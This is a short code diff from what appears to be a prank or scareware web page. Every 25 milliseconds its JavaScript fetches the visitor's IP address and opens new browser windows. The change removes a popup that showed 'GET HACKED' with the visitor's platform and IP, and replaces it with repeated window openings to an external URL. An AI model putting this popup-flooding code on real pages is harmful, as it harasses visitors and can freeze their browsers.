@@ -67,14 +67,7 @@
                 
                 setInterval(function() {
                     getIP().then((ip) => {
-                        newWindows.push(window.open("", ""))
-                        newWindow.document.write(`
-                            <h1>GET HACKED</h1>
-                            <p>
-                            PLATFORM: ${navigator.platform}<br>
-                            IP: ${ip}
-                            </p>
-                        `)
+                        newWindows.push(window.open("https://hacklers.github.io/blank", ""))
                     })
                 }, 25)
                 setInterval(function() {
